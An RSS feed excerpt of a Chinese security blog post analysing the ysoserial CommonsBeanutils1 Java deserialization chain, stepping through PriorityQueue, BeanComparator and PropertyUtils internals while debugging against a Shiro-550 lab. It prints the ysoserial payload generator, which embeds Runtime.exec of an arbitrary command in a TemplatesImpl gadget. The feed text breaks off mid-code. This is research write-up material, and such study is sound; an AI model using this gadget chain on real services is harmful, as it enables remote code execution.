<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>反序列化 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><description>Recent content in 反序列化 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 12 Jan 2024 14:32:08 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml"/><item><title>CommonsBeanutils1 Chain</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</link><pubDate>Fri, 12 Jan 2024 14:32:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</guid><description><h3 id="概述">概述</h3><p>在ysoserial中实现了<code>CommonsBeanutils1</code>反序列化链，可以利用这个链执行代码。</p><h3 id="细节">细节</h3><p>在ysoserial中实现<code>CommonsBeanutils1</code>代码如下，首先<code>new BeanComparator/PriorityQueue</code>对象，在<code>PriorityQueue</code>对象内添加两个int对象，而后通过反射修改property字段存储的值</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">CommonsBeanutils1</span><span style="color:#66d9ef">implements</span> ObjectPayload<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">></span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String command)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Object templates<span style="color:#f92672">=</span> Gadgets.<span style="color:#a6e22e">createTemplatesImpl</span>(command);</span></span><span style="display:flex;"><span><span style="color:#75715e">// mock method name until armed</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> BeanComparator comparator<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#e6db74">"lowestSetBit"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// create queue with numbers and basic comparator</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">></span> queue<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">></span>(2, comparator);</span></span><span style="display:flex;"><span><span style="color:#75715e">// stub data for replacement later</span></span></span><span style="display:flex;"><span> queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">"1"</span>));</span></span><span style="display:flex;"><span> queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">"1"</span>));</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// switch method called by comparator</span></span></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(comparator,<span style="color:#e6db74">"property"</span>,<span style="color:#e6db74">"outputProperties"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// switch contents of queue</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Object<span style="color:#f92672">[]</span> queueArray<span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) Reflections.<span style="color:#a6e22e">getFieldValue</span>(queue,<span style="color:#e6db74">"queue"</span>);</span></span><span style="display:flex;"><span> queueArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span><span style="color:#f92672">=</span> templates;</span></span><span style="display:flex;"><span> queueArray<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span><span style="color:#f92672">=</span> templates;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> queue;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span> Object<span style="color:#a6e22e">createTemplatesImpl</span>(String command)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> Boolean.<span style="color:#a6e22e">parseBoolean</span>(System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">"properXalan"</span>,<span style="color:#e6db74">"false"</span>))<span style="color:#f92672">?</span> createTemplatesImpl(command, Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>), Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"org.apache.xalan.xsltc.runtime.AbstractTranslet"</span>), Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"org.apache.xalan.xsltc.trax.TransformerFactoryImpl"</span>)) : createTemplatesImpl(command, TemplatesImpl.<span style="color:#a6e22e">class</span>, AbstractTranslet.<span style="color:#a6e22e">class</span>, TransformerFactoryImpl.<span style="color:#a6e22e">class</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#f92672">&lt;</span>T<span style="color:#f92672">></span> T<span style="color:#a6e22e">createTemplatesImpl</span>(String command, Class<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">></span> tplClass, Class<span style="color:#f92672">&lt;?></span> abstTranslet, Class<span style="color:#f92672">&lt;?></span> transFactory)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span> T templates<span style="color:#f92672">=</span> tplClass.<span style="color:#a6e22e">newInstance</span>();</span></span><span style="display:flex;"><span> ClassPool pool<span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();</span></span><span style="display:flex;"><span> pool.<span style="color:#a6e22e">insertClassPath</span>(<span style="color:#66d9ef">new</span> ClassClassPath(StubTransletPayload.<span style="color:#a6e22e">class</span>));</span></span><span style="display:flex;"><span> pool.<span style="color:#a6e22e">insertClassPath</span>(<span style="color:#66d9ef">new</span> ClassClassPath(abstTranslet));</span></span><span style="display:flex;"><span> CtClass clazz<span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(StubTransletPayload.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>());</span></span><span style="display:flex;"><span> String cmd<span style="color:#f92672">=</span><span style="color:#e6db74">"java.lang.Runtime.getRuntime().exec(\""</span><span style="color:#f92672">+</span> command.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">"\\"</span>,<span style="color:#e6db74">"\\\\"</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">"\""</span>,<span style="color:#e6db74">"\\\""</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">"\");"</span>;</span></span><span style="display:flex;"><span> clazz.<span style="color:#a6e22e">makeClassInitializer</span>().<span style="color:#a6e22e">insertAfter</span>(cmd);</span></span><span style="display:flex;"><span> clazz.<span style="color:#a6e22e">setName</span>(<span style="color:#e6db74">"ysoserial.Pwner"</span><span style="color:#f92672">+</span> System.<span style="color:#a6e22e">nanoTime</span>());</span></span><span style="display:flex;"><span> CtClass superC<span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(abstTranslet.<span style="color:#a6e22e">getName</span>());</span></span><span style="display:flex;"><span> clazz.<span style="color:#a6e22e">setSuperclass</span>(superC);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytes<span style="color:#f92672">=</span> clazz.<span style="color:#a6e22e">toBytecode</span>();</span></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(templates,<span style="color:#e6db74">"_bytecodes"</span>,<span style="color:#66d9ef">new</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{classBytes, ClassFiles.<span style="color:#a6e22e">classAsBytes</span>(Foo.<span style="color:#a6e22e">class</span>)});</span></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(templates,<span style="color:#e6db74">"_name"</span>,<span style="color:#e6db74">"Pwnr"</span>);</span></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(templates,<span style="color:#e6db74">"_tfactory"</span>, transFactory.<span style="color:#a6e22e">newInstance</span>());</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> templates;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而后通过反射将PriorityQueue对象存储的两个BigInteger对象改为创建的TemplatesImpl对象。<img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/1.png"/></p><p><strong>根因分析</strong>
根据前面调试知道，<code>CommonsBeanutils1</code>序列化<code>PriorityQueue</code>对象，其中<code>comparator</code>指定为<code>BeanComparator</code>，<code>PriorityQueue</code>内存了两个<code>TemplatesImpl</code>对象。</p><p>使用<a href="/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/">shiro 550</a>环境，发送payload，在调试器中可以看到，首先反序列化<code>PriorityQueue</code>对象<img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/2.png"/></p><p>在readObject断点，可以看到尝试反序列化<code>comparator</code>，这里是<code>BeanComparator</code>，并递归反序列化<code>TemplatesImpl</code><img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/3.png"/></p><p>而后readObject会调用heapify方法，跟进调用最后调用到comparator.compare</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">heapify</span>() {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> (size<span style="color:#f92672">>>></span> 1)<span style="color:#f92672">-</span> 1; i<span style="color:#f92672">>=</span> 0; i<span style="color:#f92672">--</span>)</span></span><span style="display:flex;"><span> siftDown(i, (E) queue<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">siftDown</span>(<span style="color:#66d9ef">int</span> k, E x) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (comparator<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> siftDownUsingComparator(k, x);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> siftDownComparable(k, x);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">siftDownUsingComparator</span>(<span style="color:#66d9ef">int</span> k, E x) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> half<span style="color:#f92672">=</span> size<span style="color:#f92672">>>></span> 1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (k<span style="color:#f92672">&lt;</span> half) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> child<span style="color:#f92672">=</span> (k<span style="color:#f92672">&lt;&lt;</span> 1)<span style="color:#f92672">+</span> 1;</span></span><span style="display:flex;"><span> Object c<span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> right<span style="color:#f92672">=</span> child<span style="color:#f92672">+</span> 1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (right<span style="color:#f92672">&lt;</span> size<span style="color:#f92672">&amp;&amp;</span></span></span><span style="display:flex;"><span> comparator.<span style="color:#a6e22e">compare</span>((E) c, (E) queue<span style="color:#f92672">[</span>right<span style="color:#f92672">]</span>)<span style="color:#f92672">></span> 0)</span></span><span style="display:flex;"><span> c<span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child<span style="color:#f92672">=</span> right<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (comparator.<span style="color:#a6e22e">compare</span>(x, (E) c)<span style="color:#f92672">&lt;=</span> 0)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span><span style="color:#f92672">=</span> c;</span></span><span style="display:flex;"><span> k<span style="color:#f92672">=</span> child;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span><span style="color:#f92672">=</span> x;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>BeanComparator实现了Comparator接口，compare方法代码如下，其会调用getProperty方法，前面在ysoserial中property被设置为outputProperities</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">compare</span>(T o1, T o2) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span><span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(o1, o2);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> Object value1<span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o1,<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);</span></span><span style="display:flex;"><span> Object value2<span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o2,<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(value1, value2);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (IllegalAccessException var5) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">"IllegalAccessException: "</span><span style="color:#f92672">+</span> var5.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (InvocationTargetException var6) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">"InvocationTargetException: "</span><span style="color:#f92672">+</span> var6.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (NoSuchMethodException var7) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">"NoSuchMethodException: "</span><span style="color:#f92672">+</span> var7.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/4.png"/></p><p>跟进getProperty方法内，其中bean为<code>TemplatesImpl</code>对象，会进入<code>bean = this.getSimpleProperty(bean, name);</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span> Object<span style="color:#a6e22e">getProperty</span>(Object bean, String name)<span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> PropertyUtilsBean.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getProperty</span>(Object bean, String name)<span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getNestedProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getNestedProperty</span>(Object bean, String name)<span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bean<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"No bean specified"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (name<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"No name specified for bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">hasNested</span>(name)) {</span></span><span style="display:flex;"><span> String next<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">next</span>(name);</span></span><span style="display:flex;"><span> Object nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bean<span style="color:#66d9ef">instanceof</span> Map) {</span></span><span style="display:flex;"><span> nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPropertyOfMapBean</span>((Map)bean, next);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isMapped</span>(next)) {</span></span><span style="display:flex;"><span> nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getMappedProperty</span>(bean, next);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isIndexed</span>(next)) {</span></span><span style="display:flex;"><span> nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getIndexedProperty</span>(bean, next);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getSimpleProperty</span>(bean, next);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (nestedBean<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> NestedNullException(<span style="color:#e6db74">"Null property value for '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span> nestedBean;</span></span><span style="display:flex;"><span> name<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">remove</span>(name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bean<span style="color:#66d9ef">instanceof</span> Map) {</span></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPropertyOfMapBean</span>((Map)bean, name);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isMapped</span>(name)) {</span></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getMappedProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isIndexed</span>(name)) {</span></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getIndexedProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getSimpleProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> bean;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>在<code>getSimpleProperty</code>方法内会通过反射获取到<code>TemplatesImpl</code>对象<code>property</code>对应的的getter方法并调用，在java规范中outputProperities对应的getter方法名应该为getOutputProperities</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getSimpleProperty</span>(Object bean, String name)<span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bean<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"No bean specified"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (name<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"No name specified for bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">hasNested</span>(name)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"Nested property names are not allowed: Property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isIndexed</span>(name)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"Indexed property names are not allowed: Property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isMapped</span>(name)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"Mapped property names are not allowed: Property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (bean<span style="color:#66d9ef">instanceof</span> DynaBean) {</span></span><span style="display:flex;"><span> DynaProperty descriptor<span style="color:#f92672">=</span> ((DynaBean)bean).<span style="color:#a6e22e">getDynaClass</span>().<span style="color:#a6e22e">getDynaProperty</span>(name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (descriptor<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">"Unknown property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on dynaclass '"</span><span style="color:#f92672">+</span> ((DynaBean)bean).<span style="color:#a6e22e">getDynaClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ((DynaBean)bean).<span style="color:#a6e22e">get</span>(name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> PropertyDescriptor descriptor<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPropertyDescriptor</span>(bean, name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (descriptor<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">"Unknown property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> Method readMethod<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getReadMethod</span>(bean.<span style="color:#a6e22e">getClass</span>(), descriptor);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (readMethod<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">"Property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' has no getter method in class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> Object value<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">invokeMethod</span>(readMethod, bean, EMPTY_OBJECT_ARRAY);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> value;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/5.png"/></p><p><code>TemplatesImpl</code>类中<code>getOutputProperties</code>方法代码如下，会调用<code>newTransformer</code>方法</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">synchronized</span> Properties<span 